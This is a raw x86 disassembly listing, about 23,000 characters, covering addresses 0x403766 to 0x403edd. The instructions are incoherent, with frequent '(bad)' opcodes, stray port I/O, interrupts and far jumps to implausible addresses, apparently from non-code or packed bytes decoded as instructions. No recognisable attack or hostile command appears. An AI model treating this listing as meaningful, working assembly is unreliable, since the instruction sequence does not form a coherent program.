  403766:	cmp    DWORD PTR [eax],ebx
  403768:	jb     0x403732
  40376a:	and    edx,DWORD PTR [eax+0x2b38849a]
  403770:	jle    0x4037ef
  403772:	scas   eax,DWORD PTR es:[edi]
  403773:	mov    edi,edx
  403775:	inc    eax
  403776:	lahf   
  403777:	mov    ds:0x3845a52d,eax
  40377c:	shl    DWORD PTR [ebx],0xe9
  40377f:	jge    0x4037c0
  403781:	pushf  
  403782:	iret   
  403783:	fistp  DWORD PTR [esi]
  403785:	jge    0x403725
  403787:	mov    esi,0x150412f8
  40378c:	add    al,0x84
  40378e:	adc    ebx,DWORD PTR [edi+0x7b]
  403791:	xchg   edx,eax
  403792:	mov    dh,0x91
  403794:	enter  0xba1c,0x26
  403798:	(bad)  
  403799:	gs push ss
  40379b:	xchg   esp,eax
  40379c:	add    ecx,DWORD PTR [edx]
  40379e:	push   cs
  40379f:	cmp    al,BYTE PTR [ebx-0x78]
  4037a2:	arpl   WORD PTR [esi-0x1],si
  4037a5:	pop    edi
  4037a6:	inc    esp
  4037a7:	dec    ebx
  4037a8:	mov    ds:0xbe728941,eax
  4037ad:	mov    al,ds:0xfbd39693
  4037b2:	jmp    0x7615f387
  4037b7:	mov    ds:0x865ed73d,al
  4037bc:	jmp    0xf4cf72d5
  4037c1:	inc    eax
  4037c2:	sbb    ebp,DWORD PTR [eax-0x22f216fb]
  4037c8:	bound  ebp,QWORD PTR [ebx+0x5846d6d1]
  4037ce:	mov    cl,0xfa
  4037d0:	(bad)  
  4037d1:	jns    0x4037d3
  4037d3:	or     BYTE PTR [ebp+0x43],ch
  4037d6:	add    BYTE PTR [ebp-0x4e968df7],dh
  4037dc:	dec    ecx
  4037dd:	or     al,0xf1
  4037df:	push   edi
  4037e0:	add    DWORD PTR [edx],edi
  4037e2:	dec    ecx
  4037e3:	mov    ebp,0xd71ba34
  4037e8:	ret    
  4037e9:	xor    BYTE PTR [esi+0x187e17a2],ah
  4037ef:	loop   0x403827
  4037f1:	(bad)  
  4037f2:	in     eax,dx
  4037f3:	push   eax
  4037f4:	in     al,0x54
  4037f6:	xchg   edx,eax
  4037f7:	sub    al,0xe4
  4037f9:	xor    al,0x8c
  4037fb:	pop    ebp
  4037fc:	out    dx,eax
  4037fd:	adc    DWORD PTR [esi],0xd6fead1e
  403803:	push   ss
  403804:	dec    edx
  403805:	inc    ebx
  403806:	mov    esp,0x64a466f1
  40380b:	lock mov ds:0xc0ac301d,al
  403811:	push   esp
  403812:	and    BYTE PTR [ebx],al
  403814:	sub    BYTE PTR [ebp+0x3115022e],cl
  40381a:	(bad)  
  40381b:	mov    bh,BYTE PTR [esi-0x11]
  40381e:	fild   WORD PTR [ebx+0x57]
  403821:	sbb    bl,BYTE PTR [ebx-0x5bbc6154]
  403827:	dec    esp
  403828:	jl     0x4037c3
  40382a:	and    BYTE PTR [ebx+esi*2+0x9],al
  40382e:	add    ebp,DWORD PTR [ecx+0x3bb21189]
  403834:	and    eax,0x6feab544
  403839:	push   ebp
  40383a:	pop    ecx
  40383b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40383c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40383d:	bound  edi,QWORD PTR [edi+0x1c5fbede]
  403843:	jno    0x40384b
  403845:	pop    esp
  403846:	jmp    0x117a165c
  40384b:	lds    edi,FWORD PTR [edx+0x60]
  40384e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40384f:	xchg   ecx,eax
  403850:	mov    bl,0xda
  403852:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403853:	into   
  403854:	mov    fs,WORD PTR [edx-0x3b]
  403857:	nop
  403858:	(bad)  
  403859:	std    
  40385a:	jp     0x4038b0
  40385c:	sub    edx,ebx
  40385e:	or     DWORD PTR [eax+eiz*2+0x55],eax
  403862:	xor    eax,0x54592edb
  403867:	jecxz  0x403888
  403869:	pop    ebx
  40386a:	sub    DWORD PTR [ebp+0x28037d19],ebp
  403870:	cmp    BYTE PTR [edi],ch
  403872:	adc    eax,0xb41a7305
  403877:	xchg   ebx,eax
  403878:	sub    al,0x7b
  40387a:	or     al,0x93
  40387c:	ret    0x4d2e
  40387f:	gs fs shr edi,cl
  403883:	dec    ebx
  403884:	popa   
  403885:	pop    ecx
  403886:	sbb    ah,BYTE PTR [ecx+0x54]
  403889:	retf   
  40388a:	pop    eax
  40388b:	or     eax,DWORD PTR [ebx]
  40388d:	add    edi,DWORD PTR [edi+0x59]
  403890:	sub    ch,0xc2
  403893:	lods   al,BYTE PTR ds:[esi]
  403894:	pop    es
  403895:	sbb    DWORD PTR [ebx+0x19bbe688],esp
  40389b:	and    eax,0xbb011450
  4038a0:	xchg   esi,eax
  4038a1:	fwait
  4038a2:	jmp    0x4038ae
  4038a4:	mov    ds:0xdeb1a5c5,al
  4038a9:	into   
  4038aa:	mov    esp,0xc12feb15
  4038af:	icebp  
  4038b0:	int    0x9d
  4038b2:	mov    eax,0x610ef73b
  4038b7:	lods   eax,DWORD PTR ds:[esi]
  4038b8:	xchg   edi,eax
  4038b9:	loop   0x403887
  4038bb:	out    dx,eax
  4038bc:	and    BYTE PTR [eax-0x3e],dh
  4038bf:	fwait
  4038c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4038c1:	mov    al,ds:0xfaffb9f5
  4038c6:	add    ch,BYTE PTR [edx+ecx*8]
  4038c9:	fs nop
  4038cb:	dec    ecx
  4038cc:	lods   al,BYTE PTR ds:[esi]
  4038cd:	jae    0x40389d
  4038cf:	scas   eax,DWORD PTR es:[edi]
  4038d0:	mov    bl,0xb3
  4038d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4038d3:	cmp    esi,DWORD PTR [edi-0x2a5501ff]
  4038d9:	jae    0x403886
  4038db:	stos   DWORD PTR es:[edi],eax
  4038dc:	iret   
  4038dd:	xchg   edx,eax
  4038de:	sahf   
  4038df:	push   edx
  4038e0:	pop    DWORD PTR [ebp+0x35a70a23]
  4038e6:	adc    DWORD PTR [edx],edi
  4038e8:	les    esi,FWORD PTR [edi+edi*2-0x52]
  4038ec:	popf   
  4038ed:	bound  ecx,QWORD PTR [edx+esi*2]
  4038f0:	pop    ebp
  4038f1:	xlat   BYTE PTR ds:[ebx]
  4038f2:	pushf  
  4038f3:	push   ds
  4038f4:	rcr    DWORD PTR ds:0x3015cdec,0x4b
  4038fb:	jb     0x403890
  4038fd:	sub    dh,dl
  4038ff:	clc    
  403900:	inc    edi
  403901:	lods   eax,DWORD PTR ds:[esi]
  403902:	sub    esi,DWORD PTR ds:0x4b3d963e
  403908:	xlat   BYTE PTR ds:[ebx]
  403909:	and    ebx,edx
  40390b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40390c:	xor    eax,0x7d74808e
  403911:	mov    ds:0x3b717239,eax
  403916:	in     eax,dx
  403917:	daa    
  403918:	and    BYTE PTR [edx-0x56],ch
  40391b:	inc    esp
  40391c:	xor    cl,al
  40391e:	add    BYTE PTR [ebx+0x746271e1],bl
  403924:	sbb    dh,BYTE PTR [eax]
  403926:	sbb    al,0x7
  403928:	push   ecx
  403929:	loop   0x4038cd
  40392b:	imul   ebp,ecx,0x37
  40392e:	jg     0x4039a4
  403930:	retw   
  403932:	cdq    
  403933:	ins    DWORD PTR es:[edi],dx
  403934:	outs   dx,BYTE PTR ds:[esi]
  403935:	icebp  
  403936:	pop    esi
  403937:	cmp    esi,DWORD PTR [eax+eiz*2-0x21]
  40393b:	popf   
  40393c:	cli    
  40393d:	or     ebp,esp
  40393f:	xor    bh,al
  403941:	orps   xmm3,xmm6
  403944:	(bad)  
  403945:	jge    0x4039a9
  403947:	cmp    al,0xe7
  403949:	cmp    esi,DWORD PTR [eax-0x83f5dca]
  40394f:	lock neg BYTE PTR [ebx+0x56]
  403953:	dec    edi
  403954:	mov    cs,WORD PTR [edx+0x45]
  403957:	dec    esp
  403958:	lods   al,BYTE PTR ds:[esi]
  403959:	and    dh,BYTE PTR [edi+0x743cab48]
  40395f:	mov    al,ds:0x741b9b37
  403964:	cmp    al,BYTE PTR [esi+0x5e]
  403967:	jg     0x40394b
  403969:	sbb    eax,0x982a357c
  40396e:	xchg   edx,eax
  40396f:	sbb    BYTE PTR [esp+ebp*1],0x6d
  403973:	lock jmp 0x860d8e09
  403979:	jns    0x4039cc
  40397b:	in     eax,dx
  40397c:	mov    cl,0x1
  40397e:	(bad)  
  40397f:	icebp  
  403980:	imul   esp,DWORD PTR [ebp-0xf],0xffffffdd
  403984:	leave  
  403985:	xchg   cl,al
  403987:	adc    BYTE PTR [edx+0x79],0x90
  40398b:	not    DWORD PTR [esi-0x268541cd]
  403991:	cld    
  403992:	dec    eax
  403993:	repnz cmp BYTE PTR [esi+0x103f8e8e],bl
  40399a:	inc    edi
  40399b:	fdiv   st(3),st
  40399d:	(bad)  
  40399f:	push   ecx
  4039a0:	int    0x39
  4039a2:	jno    0x4039b9
  4039a4:	test   DWORD PTR [ebx-0x54],edx
  4039a7:	mov    bh,BYTE PTR [eax+ebp*2+0xa]
  4039ab:	dec    ebp
  4039ac:	or     esi,DWORD PTR [ebp-0x28efa8c5]
  4039b2:	pop    edx
  4039b3:	sub    bh,BYTE PTR [edx+0x37f65fe]
  4039b9:	xlat   BYTE PTR ds:[ebx]
  4039ba:	adc    esi,DWORD PTR [ebp-0x5ff105f1]
  4039c0:	dec    eax
  4039c1:	sub    dh,dh
  4039c3:	imul   esi,DWORD PTR [eax],0xffffffac
  4039c6:	push   ebx
  4039c7:	add    DWORD PTR [edi],edx
  4039c9:	mov    edi,eax
  4039cb:	dec    ebx
  4039cc:	loop   0x40397c
  4039ce:	and    BYTE PTR [edi+0x39e28b97],al
  4039d4:	xchg   ecx,eax
  4039d5:	addr16 loop 0x403965
  4039d8:	mov    ebp,0x2d561a24
  4039dd:	cmp    edi,esp
  4039df:	outs   dx,DWORD PTR ds:[esi]
  4039e0:	(bad)  
  4039e1:	fild   QWORD PTR [esi-0x23]
  4039e4:	xor    al,0xe
  4039e6:	lods   al,BYTE PTR ds:[esi]
  4039e7:	bnd jge 0x403975
  4039ea:	(bad)  
  4039eb:	jg     0x403a07
  4039ed:	push   esp
  4039ee:	jge    0x403a47
  4039f0:	jb     0x4039c6
  4039f2:	mov    ebp,0x2d542df2
  4039f7:	call   DWORD PTR ds:0xab0b4621
  4039fd:	mov    esi,0xb55672c
  403a02:	arpl   WORD PTR [edi],bp
  403a04:	or     eax,0x33f52a86
  403a09:	inc    ecx
  403a0a:	popf   
  403a0b:	mov    esi,0x52844fb0
  403a10:	das    
  403a11:	icebp  
  403a12:	(bad)  
  403a14:	pop    esi
  403a15:	cmp    al,0xab
  403a17:	pusha  
  403a18:	jbe    0x403a1b
  403a1a:	xchg   edx,eax
  403a1b:	mov    ds:0xb1ea9a93,eax
  403a20:	pop    esi
  403a21:	jge    0x403a1e
  403a23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a24:	mov    dh,0x39
  403a26:	fcom   QWORD PTR [ecx]
  403a28:	mov    ch,0xee
  403a2a:	and    al,0xa0
  403a2c:	sbb    bh,bl
  403a2e:	mov    bh,0x5b
  403a30:	lods   al,BYTE PTR ds:[esi]
  403a31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403a32:	xor    al,0x97
  403a34:	imul   ah
  403a36:	int    0x98
  403a38:	mov    ah,0x6
  403a3a:	gs push es
  403a3c:	inc    ecx
  403a3d:	popa   
  403a3e:	cdq    
  403a3f:	test   eax,0x15b00e4b
  403a44:	lock (bad) 
  403a47:	stos   DWORD PTR es:[edi],eax
  403a48:	xor    edx,DWORD PTR [ebp+0x1f]
  403a4b:	jne    0x403a2d
  403a4d:	jmp    0x403aa2
  403a4f:	push   ebx
  403a50:	or     al,0x76
  403a52:	aad    0xd4
  403a54:	repz mov cl,0x3e
  403a57:	sub    esi,DWORD PTR [esi+ecx*4+0x23]
  403a5b:	mov    eax,ds:0xd81c4047
  403a60:	push   eax
  403a61:	dec    ecx
  403a62:	adc    DWORD PTR [ebx+eax*1],eax
  403a65:	fld    DWORD PTR [edx+eiz*2+0x5ef379cb]
  403a6c:	push   ss
  403a6d:	cmp    bh,dl
  403a6f:	arpl   WORD PTR [ebx],bx
  403a71:	rcl    BYTE PTR [edx],1
  403a73:	loopne 0x403ac5
  403a75:	add    al,0x9
  403a77:	xchg   edx,eax
  403a78:	cli    
  403a79:	cli    
  403a7a:	sbb    BYTE PTR [ebp-0x182db380],dl
  403a80:	or     al,0x9f
  403a82:	add    al,0x60
  403a84:	test   eax,0x8e3bf05b
  403a89:	xor    esi,DWORD PTR [edx-0x22]
  403a8c:	pop    ebx
  403a8d:	loop   0x403a38
  403a8f:	out    0xba,al
  403a91:	xchg   edx,eax
  403a92:	add    eax,0x7853fb0e
  403a97:	pop    es
  403a98:	or     eax,0x1f0b8fb3
  403a9d:	jbe    0x403a57
  403a9f:	and    esi,DWORD PTR [edx-0x5c212602]
  403aa5:	daa    
  403aa6:	scas   al,BYTE PTR es:[edi]
  403aa7:	(bad)  
  403aa8:	call   0x955d880a
  403aad:	add    esi,DWORD PTR [esi-0x20]
  403ab0:	into   
  403ab1:	push   ecx
  403ab2:	push   ds
  403ab3:	daa    
  403ab4:	jg     0x403a8b
  403ab6:	push   edx
  403ab7:	leave  
  403ab8:	inc    ecx
  403ab9:	and    BYTE PTR [eax],dl
  403abb:	aam    0x4b
  403abd:	dec    ecx
  403abe:	adc    ecx,DWORD PTR [ecx+0xd27a26f]
  403ac4:	jle    0x403a5f
  403ac6:	popf   
  403ac7:	shr    BYTE PTR [eax+0x7e585925],cl
  403acd:	jo     0x403b41
  403acf:	sub    edx,eax
  403ad1:	add    esi,edx
  403ad3:	inc    ecx
  403ad4:	sbb    al,0x13
  403ad6:	sub    eax,0xc31f1ae
  403adb:	loope  0x403b09
  403add:	and    cl,BYTE PTR [esi+0x6]
  403ae0:	test   al,0xa8
  403ae2:	xor    eax,0x6219deb7
  403ae7:	loope  0x403b15
  403ae9:	mov    ecx,DWORD PTR [edx]
  403aeb:	or     BYTE PTR [ebp-0x34],al
  403aee:	rcr    DWORD PTR [edx-0x7c],0x5c
  403af2:	pop    DWORD PTR ds:0xd2bf6345
  403af8:	aad    0xfe
  403afa:	push   0x80f2e4b4
  403aff:	loopne 0x403afb
  403b01:	or     eax,0x124766cb
  403b06:	or     BYTE PTR [ecx-0x3f],0x11
  403b0a:	imul   ecx,DWORD PTR [eax+0x249db490],0x15
  403b11:	(bad)  
  403b12:	enter  0x6939,0x2e
  403b16:	aam    0xb4
  403b18:	lahf   
  403b19:	lea    eax,[ebx+0x7d]
  403b1c:	repz das 
  403b1e:	push   esi
  403b1f:	mov    ?,WORD PTR [bx+si-0xe]
  403b23:	xchg   ebx,eax
  403b24:	mov    fs,WORD PTR [edi-0x61]
  403b27:	inc    ecx
  403b28:	ret    0x4006
  403b2b:	pop    ss
  403b2c:	jno    0x403b56
  403b2e:	fwait
  403b2f:	adc    ch,bh
  403b31:	sbb    eax,0x65d97656
  403b36:	push   0x712f107b
  403b3b:	call   0x505d61d6
  403b40:	mov    dh,0xc1
  403b42:	cmp    edi,DWORD PTR [edx+edi*1]
  403b45:	sub    DWORD PTR [esi],edi
  403b47:	push   esi
  403b48:	add    al,0xbb
  403b4a:	sub    al,0xc6
  403b4c:	(bad)  
  403b50:	mov    al,ds:0x501f5173
  403b55:	aad    0xa0
  403b57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b58:	aam    0xfa
  403b5a:	cmp    BYTE PTR [ecx-0x80],bh
  403b5d:	jmp    0x403b93
  403b5f:	and    eax,0x8b08bb9c
  403b64:	add    cl,BYTE PTR [esi-0x1d]
  403b67:	xchg   edx,eax
  403b68:	dec    esi
  403b69:	out    0xda,eax
  403b6b:	xchg   ebx,eax
  403b6c:	adc    al,BYTE PTR [eax+0x14610b0]
  403b72:	inc    edi
  403b73:	jp     0x403afe
  403b75:	enter  0x6970,0x79
  403b79:	pop    es
  403b7a:	dec    BYTE PTR [ebx]
  403b7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403b7d:	cmp    eax,0xa601597c
  403b82:	xchg   DWORD PTR [edi],edx
  403b84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b85:	and    BYTE PTR [eax+ebp*1+0x72],dh
  403b89:	and    bh,bh
  403b8b:	out    dx,eax
  403b8c:	stos   BYTE PTR es:[edi],al
  403b8d:	repnz sub DWORD PTR [ebx-0x6b],eax
  403b91:	xchg   esi,eax
  403b92:	and    ah,ch
  403b94:	sbb    BYTE PTR [edi+eax*2],dh
  403b97:	cs (bad) 
  403b99:	in     eax,dx
  403b9a:	mov    al,0xae
  403b9c:	test   dh,0x7
  403b9f:	xchg   edi,eax
  403ba0:	mov    edi,0xe8cd581a
  403ba5:	inc    eax
  403ba6:	in     al,0x6f
  403ba8:	(bad)  
  403baa:	jmp    0x403bba
  403bac:	or     ebx,edx
  403bae:	jp     0x403bd4
  403bb0:	pop    edx
  403bb1:	nop
  403bb2:	iret   
  403bb3:	xor    ah,dl
  403bb5:	arpl   WORD PTR [ecx],si
  403bb7:	mov    dl,0x79
  403bb9:	sub    DWORD PTR [edx-0x11c44536],esi
  403bbf:	xchg   ebp,eax
  403bc0:	loopne 0x403bac
  403bc2:	call   0xa640722b
  403bc7:	ret    
  403bc8:	cmp    esi,DWORD PTR ds:0xc1e63efd
  403bce:	mov    esp,0x65844ffd
  403bd3:	cmp    dl,BYTE PTR ss:[edi]
  403bd6:	pop    ds
  403bd7:	mov    ah,BYTE PTR [edx-0x39]
  403bda:	xchg   esi,eax
  403bdb:	bound  edi,QWORD PTR [edi]
  403bdd:	or     ecx,edi
  403bdf:	xor    al,0x34
  403be1:	(bad)  
  403be2:	xchg   ebp,eax
  403be3:	aad    0xe0
  403be5:	mov    edi,0x5f4bb747
  403bea:	adc    DWORD PTR [esi+0x4d],ecx
  403bed:	enter  0x4b2b,0x3c
  403bf1:	cmp    al,0xaf
  403bf3:	scas   al,BYTE PTR es:[edi]
  403bf4:	inc    ebp
  403bf5:	xor    BYTE PTR [edi-0xa],cl
  403bf8:	sub    bh,BYTE PTR [ecx]
  403bfa:	xacquire xchg DWORD PTR [eax],esp
  403bfd:	sbb    DWORD PTR [ebx],ebp
  403bff:	aaa    
  403c00:	test   al,0x69
  403c02:	inc    ebp
  403c03:	outs   dx,DWORD PTR ds:[esi]
  403c04:	or     eax,0x427f4883
  403c09:	push   ebp
  403c0a:	xchg   DWORD PTR [ebx],eax
  403c0c:	xchg   BYTE PTR [ebp+0x553ffddf],dh
  403c12:	rcl    DWORD PTR [edi-0x593a843c],1
  403c18:	xor    BYTE PTR [ecx-0x53],dl
  403c1b:	or     BYTE PTR [ebx+0x1c],0xf9
  403c1f:	pop    edi
  403c20:	call   0x4bdfdbf1
  403c25:	sbb    BYTE PTR [edx],ch
  403c27:	cld    
  403c28:	stos   BYTE PTR es:[edi],al
  403c29:	rcl    edx,1
  403c2b:	or     esp,DWORD PTR [edx-0x39]
  403c2e:	sub    DWORD PTR [ebp-0x3a8d1136],eax
  403c34:	mov    ecx,es
  403c36:	(bad)
  403c39:	jge    0x403c1f
  403c3b:	int    0xed
  403c3d:	or     cl,ah
  403c3f:	adc    al,0x24
  403c41:	mul    BYTE PTR [edx+edx*4-0x62d58100]
  403c48:	mov    ch,0x3e
  403c4a:	call   0x73c7:0x8d6d1a1a
  403c51:	or     esp,DWORD PTR [ebx+0x24]
  403c54:	sub    eax,0x7d18c8b5
  403c59:	mov    ah,BYTE PTR [edi+0x61161381]
  403c5f:	leave  
  403c60:	aaa    
  403c61:	repz jo 0x403c79
  403c64:	leave  
  403c65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c66:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403c67:	xchg   ebp,eax
  403c68:	adc    dl,al
  403c6a:	fs mov cl,0x73
  403c6d:	mov    edi,0x1e512188
  403c72:	push   edi
  403c73:	and    BYTE PTR [esi-0x1b],bl
  403c76:	xchg   esp,eax
  403c77:	cmp    ebx,DWORD PTR [ecx]
  403c79:	shr    DWORD PTR [edx+0x2f],cl
  403c7c:	push   cs
  403c7d:	push   ebp
  403c7e:	mov    BYTE PTR [ebp+0x17],dh
  403c81:	jmp    0x403cb4
  403c83:	scas   eax,DWORD PTR es:[edi]
  403c84:	inc    esi
  403c85:	cli    
  403c86:	and    eax,0xdb01c891
  403c8b:	mov    ebx,0xa6de49f
  403c90:	pusha  
  403c91:	cmp    DWORD PTR [ecx+0x41],edi
  403c94:	imul   eax,DWORD PTR [esi-0x50],0x55948a4a
  403c9b:	mov    eax,0xdd583848
  403ca0:	push   ecx
  403ca1:	addr16 push ds
  403ca3:	mov    al,ds:0x5961fb20
  403ca8:	aad    0x6
  403caa:	stc    
  403cab:	sar    BYTE PTR [ecx-0x36c8f809],cl
  403cb1:	leave  
  403cb2:	dec    ecx
  403cb3:	jno    0x403d30
  403cb5:	fwait
  403cb6:	jns    0x403c62
  403cb8:	popf   
  403cb9:	loop   0x403cfb
  403cbb:	mov    cl,0x72
  403cbd:	add    DWORD PTR [edi],esp
  403cbf:	ss push edx
  403cc1:	sub    DWORD PTR [edx-0x21],eax
  403cc4:	sbb    edi,esi
  403cc6:	out    0x95,al
  403cc8:	xchg   ebx,eax
  403cc9:	imul   BYTE PTR [edx-0x57ac0dce]
  403ccf:	test   al,0xbe
  403cd1:	add    DWORD PTR [esi],edi
  403cd3:	sub    eax,0x7b57429
  403cd8:	cmp    DWORD PTR [edx-0x5bb08a49],eax
  403cde:	idiv   DWORD PTR [edi-0x59]
  403ce1:	cs nop
  403ce3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ce4:	and    eax,0x8b191164
  403ce9:	cmp    al,0x8d
  403ceb:	fwait
  403cec:	in     al,0x67
  403cee:	push   edx
  403cef:	xchg   bx,ax
  403cf1:	loope  0x403d69
  403cf3:	mov    bl,0x32
  403cf5:	mov    ebx,0x15adea1d
  403cfa:	mov    cl,0x1e
  403cfc:	mov    al,0x4
  403cfe:	fldcw  WORD PTR [esi]
  403d00:	xchg   esp,eax
  403d01:	test   ebx,esi
  403d03:	mov    ecx,0x93b6ccb8
  403d08:	test   BYTE PTR [ebx+ebx*2+0x53664bdc],al
  403d0f:	outs   dx,BYTE PTR ds:[esi]
  403d10:	cmp    BYTE PTR [edx],dl
  403d12:	and    al,0xbc
  403d14:	lods   eax,DWORD PTR ds:[esi]
  403d15:	jmp    0x403ca4
  403d17:	xchg   ecx,eax
  403d18:	int3   
  403d19:	in     eax,0xcb
  403d1b:	adc    cl,BYTE PTR [edx+0xc]
  403d1e:	in     al,0x3
  403d20:	mov    bh,BYTE PTR [esp+ebx*4]
  403d23:	imul   esi,DWORD PTR [ecx+0x4f8154f4],0xb0aa416c
  403d2d:	ficomp DWORD PTR [ebp+0x69a59c6c]
  403d33:	or     edx,DWORD PTR [ebx]
  403d35:	sbb    DWORD PTR [ecx+0x60],ecx
  403d38:	xchg   ebx,eax
  403d39:	add    al,0x8d
  403d3b:	mov    DWORD PTR [edi+0x52a380f3],esp
  403d41:	js     0x403d8a
  403d43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d44:	or     al,0xac
  403d46:	ja     0x403d23
  403d48:	push   ecx
  403d49:	xlat   BYTE PTR ds:[ebx]
  403d4a:	adc    dl,0x48
  403d4d:	xor    al,0x64
  403d4f:	and    al,0x39
  403d51:	cmp    al,0xe9
  403d53:	adc    ah,BYTE PTR [eax-0x4209102c]
  403d59:	inc    esi
  403d5a:	xchg   BYTE PTR [edx-0x26],dh
  403d5d:	xchg   ecx,eax
  403d5e:	in     eax,0x4e
  403d60:	pop    ebp
  403d61:	push   ss
  403d62:	addr16 inc esi
  403d64:	mov    dh,0x30
  403d66:	and    ebx,DWORD PTR [edx-0x49]
  403d69:	imul   esp,DWORD PTR [ecx],0xe3fdc10d
  403d6f:	cli    
  403d70:	aas    
  403d71:	push   ecx
  403d72:	mov    ch,0xd8
  403d74:	bound  esp,QWORD PTR [ecx]
  403d76:	dec    edx
  403d77:	sub    eax,0xc5039f1e
  403d7c:	fmul   DWORD PTR [esi+ecx*2+0x19]
  403d80:	jno    0x403dd0
  403d82:	xchg   esi,eax
  403d83:	xchg   esp,eax
  403d84:	aam    0xae
  403d86:	jecxz  0x403de7
  403d88:	jmp    0x7267:0xe82ec1fb
  403d8f:	adc    DWORD PTR [edi],ecx
  403d91:	stos   BYTE PTR es:[edi],al
  403d92:	ins    BYTE PTR es:[edi],dx
  403d93:	fnstcw WORD PTR [edx]
  403d95:	sahf   
  403d96:	inc    eax
  403d97:	mov    eax,ds:0xc64c1f85
  403d9c:	xlat   BYTE PTR ds:[ebx]
  403d9d:	call   0x6b7a:0x2f51bfb8
  403da4:	dec    edx
  403da5:	pop    ebp
  403da6:	xchg   edi,eax
  403da7:	xchg   esp,eax
  403da8:	pop    esp
  403da9:	add    ah,BYTE PTR [ebx]
  403dab:	mov    ah,0xa0
  403dad:	daa    
  403dae:	mov    BYTE PTR ds:0x1216bf6a,bl
  403db4:	sub    DWORD PTR [esi],ebx
  403db6:	(bad)  
  403db7:	or     BYTE PTR [ecx+0x6b],bh
  403dba:	push   es
  403dbb:	or     ecx,DWORD PTR [ecx-0x5f]
  403dbe:	mov    ds:0x9d851110,eax
  403dc3:	popf   
  403dc4:	enter  0x8439,0x1e
  403dc8:	xlat   BYTE PTR ds:[ebx]
  403dc9:	or     BYTE PTR [ecx+0x529945a1],ah
  403dcf:	mov    ds:0xe94bc86e,eax
  403dd4:	int    0x37
  403dd6:	push   es
  403dd7:	(bad)  
  403dd8:	xlat   BYTE PTR ds:[ebx]
  403dd9:	mov    edi,0xceba8ab6
  403dde:	xor    bl,BYTE PTR [ebx+0x5]
  403de1:	xor    cl,BYTE PTR [ebp+0x4]
  403de4:	in     al,0x87
  403de6:	cdq    
  403de7:	test   BYTE PTR [eax+ebp*4],bh
  403dea:	cmp    BYTE PTR [ecx+esi*1-0x2ab63650],ch
  403df1:	cmp    eax,0x3131af77
  403df6:	enter  0x304b,0x7c
  403dfa:	out    dx,al
  403dfb:	sahf   
  403dfc:	(bad)  
  403dfe:	ret    
  403dff:	dec    edi
  403e00:	push   0x3e
  403e02:	call   0xa5641abd
  403e07:	push   es
  403e08:	lods   al,BYTE PTR ds:[esi]
  403e09:	scas   al,BYTE PTR es:[edi]
  403e0a:	les    edi,FWORD PTR [ebp+0x286bf5c2]
  403e10:	push   ecx
  403e11:	sub    DWORD PTR [esi-0x28],0xffffff80
  403e15:	in     al,dx
  403e16:	jmp    0x9f197b8f
  403e1b:	cli    
  403e1c:	cmp    edi,DWORD PTR [ebx-0x1d]
  403e1f:	push   ss
  403e20:	jb     0x403e37
  403e22:	fnstenv ss:[edi+0x7d]
  403e26:	and    ecx,esp
  403e28:	jnp    0x403e95
  403e2a:	sbb    ebp,edi
  403e2c:	or     ebx,edx
  403e2e:	and    DWORD PTR [ebp+ebp*2-0x37f9666a],0xffffffcf
  403e36:	sbb    DWORD PTR [edx+0x4],edi
  403e39:	ficom  DWORD PTR [esp+ebp*8+0x6c]
  403e3d:	push   ss
  403e3e:	or     al,0x3f
  403e40:	push   ebp
  403e41:	jo     0x403e0f
  403e43:	cmp    al,bh
  403e45:	cs ret 0xe773
  403e49:	and    BYTE PTR [esi-0x7b],dl
  403e4c:	mov    ebp,0xa97c887e
  403e51:	sub    edx,edx
  403e53:	outs   dx,BYTE PTR ds:[esi]
  403e54:	jbe    0x403e82
  403e56:	jecxz  0x403ec1
  403e58:	inc    esp
  403e59:	test   BYTE PTR [ebp+0x2d],dl
  403e5c:	or     DWORD PTR [ebp-0x72],ebx
  403e5f:	lods   al,BYTE PTR ds:[esi]
  403e60:	outs   dx,DWORD PTR ds:[esi]
  403e61:	aad    0x9
  403e63:	cmc    
  403e64:	cld    
  403e65:	pop    ebp
  403e66:	arpl   sp,si
  403e68:	pop    esp
  403e69:	and    DWORD PTR [esi+eiz*8+0x17795733],ecx
  403e70:	cmp    dl,bh
  403e72:	or     eax,0x57d0505e
  403e77:	dec    ebp
  403e78:	push   eax
  403e79:	adc    BYTE PTR [esi],bl
  403e7b:	jo     0x403ea9
  403e7d:	push   cs
  403e7e:	cmc    
  403e7f:	mov    bl,0x43
  403e81:	cmp    eax,0xb8786cb6
  403e86:	or     BYTE PTR [ebx],0xc3
  403e89:	aad    0x68
  403e8b:	lock push 0xffffffbe
  403e8e:	bound  ebp,QWORD PTR [ebx+0x59]
  403e91:	sub    BYTE PTR [edx-0x6d1bbda7],bh
  403e97:	xchg   DWORD PTR [edi-0xa2a5f0b],ebx
  403e9d:	dec    eax
  403e9e:	cmp    eax,0xa7255991
  403ea3:	test   edi,edx
  403ea5:	xor    DWORD PTR [edx],edx
  403ea7:	mov    dl,0x40
  403ea9:	cli    
  403eaa:	daa    
  403eab:	ja     0x403ee0
  403ead:	mov    ecx,0x71a2a5c7
  403eb2:	les    ecx,FWORD PTR [edi+edi*1-0x166d54b3]
  403eb9:	retf   
  403eba:	jge    0x403e77
  403ebc:	js     0x403ec6
  403ebe:	xor    eax,0xa8393f23
  403ec3:	xor    dh,ch
  403ec5:	or     ah,al
  403ec7:	sbb    al,0x9f
  403ec9:	pusha  
  403eca:	fisub  DWORD PTR ds:0x459ae0ee
  403ed0:	pushf  
  403ed1:	cmc    
  403ed2:	stc    
  403ed3:	jmp    0xd4cf:0x11423411
  403eda:	push   ebx
  403edb:	push   esi
  403edc:	popf   
  403edd:	add    eax,0x21758b84
